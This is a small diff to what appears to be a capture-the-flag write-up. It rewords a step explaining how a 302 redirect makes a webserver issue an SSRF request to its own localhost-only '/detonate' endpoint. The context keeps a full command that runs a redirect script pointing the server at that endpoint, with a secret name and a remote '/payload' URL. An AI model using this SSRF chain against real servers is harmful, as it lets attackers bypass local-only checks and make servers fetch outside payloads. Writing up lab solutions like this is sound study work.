@@ -10,7 +10,7 @@ Include the header with the IP
 
 3) How to use /detonate and satisfy the 127.0.0.1 ip check:
 
-Send a 302 redirect to SSRF the webserver into making a local request calling the detonate endpoints.
+Send a 302 redirect to launch an SSRF attack against the webserver, into the detonate endpoint.
 
 python3 redir.py 80 http://127.0.0.1:15555/detonate?name=supersecretabc123xyz\&url=http://0x0y0z/payload
 
